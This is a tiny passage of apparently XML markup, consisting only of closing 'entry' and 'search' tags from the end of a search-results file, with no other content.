  </entry>
</search>
